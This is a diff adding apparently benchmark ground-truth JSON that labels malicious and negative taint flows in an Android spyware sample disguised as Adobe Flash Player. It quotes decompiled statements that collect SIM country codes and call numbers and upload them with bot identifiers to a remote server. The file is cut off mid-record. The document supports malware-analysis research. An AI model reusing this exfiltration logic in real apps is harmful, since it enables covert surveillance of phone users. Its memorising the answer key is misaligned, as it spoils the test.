@@ -1,0 +1,1175 @@
+{
+  "fileName": "backflash.apk",
+  "day": "2019-10-02",
+  "findings": [
+    {
+      "source": {
+        "statement": "String BotLocation = telephonyManager.getSimCountryIso();",
+        "methodName": "public void onCreate()",
+        "className": "com.adobe.flashplayer_.AdobeFlashCore",
+        "lineNo": 59,
+        "targetName": "getSimCountryIso",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r4.<android.telephony.TelephonyManager: java.lang.String getSimCountryIso()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outputStreamWriter.write(data);",
+        "methodName": "private void writeConfig(String config, String data)",
+        "className": "com.adobe.flashplayer_.AdobeFlashCore",
+        "lineNo": 168,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "writeConfig(\"BotLocation\", BotLocation);",
+          "methodName": "public void onCreate()",
+          "className": "com.adobe.flashplayer_.AdobeFlashCore",
+          "lineNo": 80,
+          "ID": 1
+        }
+      ],
+      "attributes": {
+        "lifecycle": true,
+        "partialFlow": true
+      },
+      "ID": 1,
+      "description": "This malicious flow leaks the SIM country code into an OutputStream, writing to data that is later read by following flow.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "InputStream inputStream = context.openFileInput(config);",
+        "methodName": "private String readConfig(String config, Context context)",
+        "className": "com.adobe.flashplayer_.FlashW",
+        "lineNo": 64,
+        "targetName": "openFileInput",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r2.<android.content.Context: java.io.FileInputStream openFileInput(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "receiveString = bufferedReader.readLine();",
+          "methodName": "private String readConfig(String config, Context context)",
+          "className": "com.adobe.flashplayer_.FlashW",
+          "lineNo": 72,
+          "ID": 1
+        },
+        {
+          "statement": "stringBuilder.append(receiveString);",
+          "methodName": "private String readConfig(String config, Context context)",
+          "className": "com.adobe.flashplayer_.FlashW",
+          "lineNo": 73,
+          "ID": 2
+        },
+        {
+          "statement": "return stringBuilder.toString();",
+          "methodName": "private String readConfig(String config, Context context)",
+          "className": "com.adobe.flashplayer_.FlashW",
+          "lineNo": 77,
+          "ID": 3
+        },
+        {
+          "statement": "String BotLocation = readConfig(\"BotLocation\", context);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashW",
+          "lineNo": 31,
+          "ID": 4
+        },
+        {
+          "statement": "new FlashVirtual().execute(new String[]{\"&b=\" + BotID + \"&c=\" + BotNetwork.replace(\":\", \"\") + \"&d=\" + BotLocation + \"&e=\" + readConfig(\"BotPhone\", context) + \"&f=\" + BotVer + \"&g=\" + SDK + \"&h=package&i=system\", context.getFileStreamPath(\"package\").toString(), URL});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashW",
+          "lineNo": 44,
+          "ID": 5
+        },
+        {
+          "statement": "String urlString = params[2] + \"?a=3\" + params[0];",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": -1,
+          "ID": 6
+        },
+        {
+          "statement": "conn = (HttpURLConnection) new URL(urlString).openConnection();",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 41,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "partialFlow": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "The second part of the above partial flow that leaks the country code into a URL that is then retrieved. Note: execute(....) internally calls doInBackground(...).",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String inP = intent.getStringExtra(\"incoming_number\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashY",
+        "lineNo": 28,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"incoming_number\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, bufferSize);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 58,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.DataOutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "saveData(intent.getStringExtra(\"incoming_number\"), inP, context);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashY",
+          "lineNo": 49,
+          "ID": 1
+        },
+        {
+          "statement": "osw.write(data);",
+          "methodName": "private void saveData(String data, String f, Context context)",
+          "className": "com.adobe.flashplayer_.FlashY",
+          "lineNo": 72,
+          "ID": 2
+        },
+        {
+          "statement": "new FlashVirtual().execute(new String[]{\"&b=\" + BotID + \"&c=\" + BotNetwork.replace(\":\", \"\") + \"&d=\" + BotLocation + \"&e=\" + readConfig(\"BotPhone\", context) + \"&f=\" + BotVer + \"&g=\" + SDK + \"&h=in_call&i=\" + inP, context.getFileStreamPath(inP).toString(), URL});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashY",
+          "lineNo": 52,
+          "ID": 3
+        },
+        {
+          "statement": "String exsistingFileName = params[1];",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 27,
+          "ID": 4
+        },
+        {
+          "statement": "FileInputStream fileInputStream = new FileInputStream(new File(exsistingFileName));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 39,
+          "ID": 5
+        },
+        {
+          "statement": "int bytesRead = fileInputStream.read(buffer, 0, bufferSize);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 55,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious flow sends the telephone number of incoming calls via file upload to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String inP = intent.getStringExtra(\"incoming_number\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashY",
+        "lineNo": 28,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"incoming_number\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (netInfo != null && netInfo.isConnectedOrConnecting()) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashY",
+          "lineNo": 51,
+          "ID": 1
+        },
+        {
+          "statement": "new FlashVirtual().execute(new String[]{\"&b=\" + BotID + \"&c=\" + BotNetwork.replace(\":\", \"\") + \"&d=\" + BotLocation + \"&e=\" + readConfig(\"BotPhone\", context) + \"&f=\" + BotVer + \"&g=\" + SDK + \"&h=in_call&i=\" + inP, context.getFileStreamPath(inP).toString(), URL});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashY",
+          "lineNo": 52,
+          "ID": 2
+        },
+        {
+          "statement": "String urlString = params[2] + \"?a=3\" + params[0];",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": -1,
+          "ID": 3
+        },
+        {
+          "statement": "conn = (HttpURLConnection) new URL(urlString).openConnection();",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 41,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 4,
+      "description": "This malicious flow reads incoming number and appends it in a URL as parameter for a HTTP POST request to a remote server. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 57,
+        "decompiledSourceLineNo": 40,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 148,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "partialFlow": true,
+        "pathConstraints": true
+      },
+      "ID": 5,
+      "description": "This malicious flow writes phone number to a file which will be posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 86,
+        "decompiledSourceLineNo": 55,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 148,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "partialFlow": true,
+        "pathConstraints": true
+      },
+      "ID": 6,
+      "description": "This malicious flow writes phone number to a file which will be posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\") + \"\\n\", new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 115,
+        "decompiledSourceLineNo": 67,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 148,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "partialFlow": true,
+        "pathConstraints": true
+      },
+      "ID": 7,
+      "description": "This malicious flow writes phone number to a file which will be posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 137,
+        "decompiledSourceLineNo": 75,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 148,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "partialFlow": true,
+        "pathConstraints": true
+      },
+      "ID": 8,
+      "description": "This malicious flow writes phone number to a file which will be posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "if (intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").indexOf(indexOf) != -1) {",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 71,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 148,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 9,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "} else if (!(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").indexOf(cvadi) == -1 || cvadi == \"\" || sa || getResultData() == null)) {",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 101,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 148,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 10,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 57,
+        "decompiledSourceLineNo": 40,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 11,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 86,
+        "decompiledSourceLineNo": 55,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 12,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\") + \"\\n\", new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 115,
+        "decompiledSourceLineNo": 67,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 13,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 137,
+        "decompiledSourceLineNo": 75,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 14,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "if (intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").indexOf(indexOf) != -1) {",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 71,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 15,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "} else if (!(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").indexOf(cvadi) == -1 || cvadi == \"\" || sa || getResultData() == null)) {",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 101,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream dos = new DataOutputStream(conn.getOutputStream());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 48,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r13.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 16,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "saveData(intent.getStringExtra(\"incoming_number\"), inP, context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashY",
+        "lineNo": 49,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"incoming_number\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashY",
+        "lineNo": 72,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {
+        "lifecycle": true,
+        "partialFlow": true
+      },
+      "ID": 17,
+      "description": "This malicious flow writes incoming phone number to a file which will be posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String inP = intent.getStringExtra(\"incoming_number\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashY",
+        "lineNo": 28,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"incoming_number\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "osw.write(data);",
+        "methodName": "private void saveData(String data, String f, Context context)",
+        "className": "com.adobe.flashplayer_.FlashY",
+        "lineNo": 72,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 18,
+      "description": "Negative flow.",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 57,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, bufferSize);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 58,
+        "decompiledSourceLineNo": 40,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.DataOutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new FlashVirtual().execute(new String[]{\"&b=\" + BotID + \"&c=\" + BotNetwork.replace(\":\", \"\") + \"&d=\" + BotLocation + \"&e=\" + readConfig(\"BotPhone\", context) + \"&f=\" + BotVer + \"&g=\" + SDK + \"&h=blocked_call&i=\" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(\".txt\").toString()).toString(), URL});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashZ",
+          "lineNo": 58,
+          "decompiledSourceLineNo": 41,
+          "ID": 1
+        },
+        {
+          "statement": "String exsistingFileName = params[1];",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 27,
+          "ID": 2
+        },
+        {
+          "statement": "FileInputStream fileInputStream = new FileInputStream(new File(exsistingFileName));",
+          "methodName": "public String doInBackground(String... params)",
